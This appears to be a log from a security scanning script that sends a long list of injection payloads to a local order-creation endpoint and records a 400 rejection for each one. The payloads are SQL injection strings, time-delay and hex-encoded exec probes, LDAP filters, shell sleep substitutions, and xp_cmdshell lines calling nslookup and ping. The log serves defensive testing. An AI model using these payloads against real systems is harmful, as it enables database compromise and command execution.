[INFO]00:17:43:837-caseScan.py:113 >> code: 400
[INFO]00:17:43:838-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:850-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "t'exec master..xp_cmdshell 'nslookup www.google.com'--\n", "goods_id": "1"}}
[INFO]00:17:43:851-caseScan.py:113 >> code: 400
[INFO]00:17:43:852-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:863-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "--sp_password\n", "goods_id": "1"}}
[INFO]00:17:43:864-caseScan.py:113 >> code: 400
[INFO]00:17:43:864-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:876-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x27UNION SELECT\n", "goods_id": "1"}}
[INFO]00:17:43:877-caseScan.py:113 >> code: 400
[INFO]00:17:43:877-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:889-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' UNION SELECT\n", "goods_id": "1"}}
[INFO]00:17:43:890-caseScan.py:113 >> code: 400
[INFO]00:17:43:891-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:904-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' UNION ALL SELECT\n", "goods_id": "1"}}
[INFO]00:17:43:904-caseScan.py:113 >> code: 400
[INFO]00:17:43:905-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:917-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or (EXISTS)\n", "goods_id": "1"}}
[INFO]00:17:43:918-caseScan.py:113 >> code: 400
[INFO]00:17:43:918-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:930-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' (select top 1\n", "goods_id": "1"}}
[INFO]00:17:43:931-caseScan.py:113 >> code: 400
[INFO]00:17:43:931-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:943-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'||UTL_HTTP.REQUEST\n", "goods_id": "1"}}
[INFO]00:17:43:944-caseScan.py:113 >> code: 400
[INFO]00:17:43:945-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:958-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "1;SELECT%20*\n", "goods_id": "1"}}
[INFO]00:17:43:959-caseScan.py:113 >> code: 400
[INFO]00:17:43:959-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:971-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "to_timestamp_tz\n", "goods_id": "1"}}
[INFO]00:17:43:972-caseScan.py:113 >> code: 400
[INFO]00:17:43:973-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:985-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "tz_offset\n", "goods_id": "1"}}
[INFO]00:17:43:986-caseScan.py:113 >> code: 400
[INFO]00:17:43:986-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:009-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "&lt;&gt;&quot;'%;)(&amp;+\n", "goods_id": "1"}}
[INFO]00:17:44:009-caseScan.py:113 >> code: 400
[INFO]00:17:44:010-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:022-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'%20or%201=1\n", "goods_id": "1"}}
[INFO]00:17:44:022-caseScan.py:113 >> code: 400
[INFO]00:17:44:023-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:035-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%27%20or%201=1\n", "goods_id": "1"}}
[INFO]00:17:44:036-caseScan.py:113 >> code: 400
[INFO]00:17:44:036-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:048-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%20$(sleep%2050)\n", "goods_id": "1"}}
[INFO]00:17:44:049-caseScan.py:113 >> code: 400
[INFO]00:17:44:050-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:062-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%20'sleep%2050'\n", "goods_id": "1"}}
[INFO]00:17:44:062-caseScan.py:113 >> code: 400
[INFO]00:17:44:063-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:075-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "char%4039%41%2b%40SELECT\n", "goods_id": "1"}}
[INFO]00:17:44:075-caseScan.py:113 >> code: 400
[INFO]00:17:44:076-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:089-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "&apos;%20OR\n", "goods_id": "1"}}
[INFO]00:17:44:090-caseScan.py:113 >> code: 400
[INFO]00:17:44:090-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:102-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'sqlattempt1\n", "goods_id": "1"}}
[INFO]00:17:44:103-caseScan.py:113 >> code: 400
[INFO]00:17:44:103-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:115-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "(sqlattempt2)\n", "goods_id": "1"}}
[INFO]00:17:44:116-caseScan.py:113 >> code: 400
[INFO]00:17:44:116-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:130-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "|\n", "goods_id": "1"}}
[INFO]00:17:44:131-caseScan.py:113 >> code: 400
[INFO]00:17:44:132-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:144-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%7C\n", "goods_id": "1"}}
[INFO]00:17:44:145-caseScan.py:113 >> code: 400
[INFO]00:17:44:145-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:158-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*|\n", "goods_id": "1"}}
[INFO]00:17:44:159-caseScan.py:113 >> code: 400
[INFO]00:17:44:160-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:171-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%2A%7C\n", "goods_id": "1"}}
[INFO]00:17:44:172-caseScan.py:113 >> code: 400
[INFO]00:17:44:172-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:185-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*(|(mail=*))\n", "goods_id": "1"}}
[INFO]00:17:44:186-caseScan.py:113 >> code: 400
[INFO]00:17:44:186-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:198-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%2A%28%7C%28mail%3D%2A%29%29\n", "goods_id": "1"}}
[INFO]00:17:44:198-caseScan.py:113 >> code: 400
[INFO]00:17:44:199-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:211-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*(|(objectclass=*))\n", "goods_id": "1"}}
[INFO]00:17:44:212-caseScan.py:113 >> code: 400
[INFO]00:17:44:212-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:224-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%2A%28%7C%28objectclass%3D%2A%29%29\n", "goods_id": "1"}}
[INFO]00:17:44:224-caseScan.py:113 >> code: 400
[INFO]00:17:44:225-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:237-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "(\n", "goods_id": "1"}}
[INFO]00:17:44:238-caseScan.py:113 >> code: 400
[INFO]00:17:44:238-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:250-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%28\n", "goods_id": "1"}}
[INFO]00:17:44:250-caseScan.py:113 >> code: 400
[INFO]00:17:44:251-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:262-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": ")\n", "goods_id": "1"}}
[INFO]00:17:44:263-caseScan.py:113 >> code: 400
[INFO]00:17:44:263-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:275-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%29\n", "goods_id": "1"}}
[INFO]00:17:44:275-caseScan.py:113 >> code: 400
[INFO]00:17:44:276-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:288-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "&\n", "goods_id": "1"}}
[INFO]00:17:44:289-caseScan.py:113 >> code: 400
[INFO]00:17:44:289-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:301-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%26\n", "goods_id": "1"}}
[INFO]00:17:44:302-caseScan.py:113 >> code: 400
[INFO]00:17:44:302-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:314-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "!\n", "goods_id": "1"}}
[INFO]00:17:44:314-caseScan.py:113 >> code: 400
[INFO]00:17:44:315-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:328-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%21\n", "goods_id": "1"}}
[INFO]00:17:44:328-caseScan.py:113 >> code: 400
[INFO]00:17:44:329-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:344-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1 or ''='\n", "goods_id": "1"}}
[INFO]00:17:44:345-caseScan.py:113 >> code: 400
[INFO]00:17:44:345-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:357-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or ''='\n", "goods_id": "1"}}
[INFO]00:17:44:358-caseScan.py:113 >> code: 400
[INFO]00:17:44:358-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:370-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' or 1=1 or 'x'='y\n", "goods_id": "1"}}
[INFO]00:17:44:371-caseScan.py:113 >> code: 400
[INFO]00:17:44:372-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:384-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "/\n", "goods_id": "1"}}
[INFO]00:17:44:384-caseScan.py:113 >> code: 400
[INFO]00:17:44:385-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:396-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "//\n", "goods_id": "1"}}
[INFO]00:17:44:397-caseScan.py:113 >> code: 400
[INFO]00:17:44:398-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:410-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "//*\n", "goods_id": "1"}}
[INFO]00:17:44:410-caseScan.py:113 >> code: 400
[INFO]00:17:44:411-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:423-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*/*\n", "goods_id": "1"}}
[INFO]00:17:44:424-caseScan.py:113 >> code: 400
[INFO]00:17:44:424-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:437-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'\n", "goods_id": "1"}}
[INFO]00:17:44:438-caseScan.py:113 >> code: 400
[INFO]00:17:44:438-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:450-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' and '' like '\n", "goods_id": "1"}}
[INFO]00:17:44:451-caseScan.py:113 >> code: 400
[INFO]00:17:44:451-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:463-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' AnD '' like '\n", "goods_id": "1"}}
[INFO]00:17:44:463-caseScan.py:113 >> code: 400
[INFO]00:17:44:464-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:478-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or '' like '\n", "goods_id": "1"}}
[INFO]00:17:44:478-caseScan.py:113 >> code: 400
[INFO]00:17:44:479-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:491-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' and '' like '%\n", "goods_id": "1"}}
[INFO]00:17:44:492-caseScan.py:113 >> code: 400
[INFO]00:17:44:492-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:504-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' aND '' like '%\n", "goods_id": "1"}}
[INFO]00:17:44:505-caseScan.py:113 >> code: 400
[INFO]00:17:44:505-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:517-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' and '' like ''--\n", "goods_id": "1"}}
[INFO]00:17:44:518-caseScan.py:113 >> code: 400
[INFO]00:17:44:518-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:530-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' and 2>1--\n", "goods_id": "1"}}
[INFO]00:17:44:531-caseScan.py:113 >> code: 400
[INFO]00:17:44:531-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:547-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' and 2>3--\n", "goods_id": "1"}}
[INFO]00:17:44:547-caseScan.py:113 >> code: 400
[INFO]00:17:44:548-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:561-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "') and ('x'='x\n", "goods_id": "1"}}
[INFO]00:17:44:562-caseScan.py:113 >> code: 400
[INFO]00:17:44:563-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:575-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": ") and (1=1\n", "goods_id": "1"}}
[INFO]00:17:44:576-caseScan.py:113 >> code: 400
[INFO]00:17:44:576-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:589-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'or''='\n", "goods_id": "1"}}
[INFO]00:17:44:589-caseScan.py:113 >> code: 400
[INFO]00:17:44:590-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:601-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'or'='or'\n", "goods_id": "1"}}
[INFO]00:17:44:602-caseScan.py:113 >> code: 400
[INFO]00:17:44:603-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:616-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "a' or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:44:616-caseScan.py:113 >> code: 400
[INFO]00:17:44:617-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:629-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\"a\"\" or 1=1--\"\n", "goods_id": "1"}}
[INFO]00:17:44:629-caseScan.py:113 >> code: 400
[INFO]00:17:44:630-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:642-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": " or a = a\n", "goods_id": "1"}}
[INFO]00:17:44:642-caseScan.py:113 >> code: 400
[INFO]00:17:44:643-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:655-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "a' or 'a' = 'a\n", "goods_id": "1"}}
[INFO]00:17:44:655-caseScan.py:113 >> code: 400
[INFO]00:17:44:656-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:668-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "1 or 1=1\n", "goods_id": "1"}}
[INFO]00:17:44:669-caseScan.py:113 >> code: 400
[INFO]00:17:44:669-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:681-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "a' waitfor delay '0:0:10'--\n", "goods_id": "1"}}
[INFO]00:17:44:682-caseScan.py:113 >> code: 400
[INFO]00:17:44:682-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:693-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "1 waitfor delay '0:0:10'--\n", "goods_id": "1"}}
[INFO]00:17:44:694-caseScan.py:113 >> code: 400
[INFO]00:17:44:694-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:706-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)\n", "goods_id": "1"}}
[INFO]00:17:44:707-caseScan.py:113 >> code: 400
[INFO]00:17:44:707-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:719-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) \n", "goods_id": "1"}}
[INFO]00:17:44:719-caseScan.py:113 >> code: 400
[INFO]00:17:44:720-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:731-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)\n", "goods_id": "1"}}
[INFO]00:17:44:732-caseScan.py:113 >> code: 400
[INFO]00:17:44:732-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:745-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)\n", "goods_id": "1"}}
[INFO]00:17:44:746-caseScan.py:113 >> code: 400
[INFO]00:17:44:747-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:760-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "a'\n", "goods_id": "1"}}
[INFO]00:17:44:761-caseScan.py:113 >> code: 400
[INFO]00:17:44:761-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:775-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "?\n", "goods_id": "1"}}
[INFO]00:17:44:776-caseScan.py:113 >> code: 400
[INFO]00:17:44:777-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:789-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1\n", "goods_id": "1"}}
[INFO]00:17:44:790-caseScan.py:113 >> code: 400
[INFO]00:17:44:790-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:803-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\u2018 or 1=1 --\n", "goods_id": "1"}}
[INFO]00:17:44:803-caseScan.py:113 >> code: 400
[INFO]00:17:44:804-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:816-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' AND userid IS NULL; --\n", "goods_id": "1"}}
[INFO]00:17:44:817-caseScan.py:113 >> code: 400
[INFO]00:17:44:818-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:830-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' AND email IS NULL; --\n", "goods_id": "1"}}
[INFO]00:17:44:831-caseScan.py:113 >> code: 400
[INFO]00:17:44:832-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:846-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "anything' OR 'x'='x\n", "goods_id": "1"}}
[INFO]00:17:44:847-caseScan.py:113 >> code: 400
[INFO]00:17:44:848-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:861-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n", "goods_id": "1"}}
[INFO]00:17:44:861-caseScan.py:113 >> code: 400
[INFO]00:17:44:862-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:874-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' AND members.email IS NULL; --\n", "goods_id": "1"}}
[INFO]00:17:44:875-caseScan.py:113 >> code: 400
[INFO]00:17:44:875-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:887-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' OR full_name LIKE '%Bob%\n", "goods_id": "1"}}
[INFO]00:17:44:888-caseScan.py:113 >> code: 400
[INFO]00:17:44:889-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:902-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "23 OR 1=1\n", "goods_id": "1"}}
[INFO]00:17:44:902-caseScan.py:113 >> code: 400
[INFO]00:17:44:903-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:914-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n", "goods_id": "1"}}
[INFO]00:17:44:915-caseScan.py:113 >> code: 400
[INFO]00:17:44:915-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:44:927-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'\n", "goods_id": "1"}}
[INFO]00:17:44:928-caseScan.py:113 >> code: 400
[INFO]00:17:44:928-caseScan.py:114 >> response: {
  "message": "data error"
}

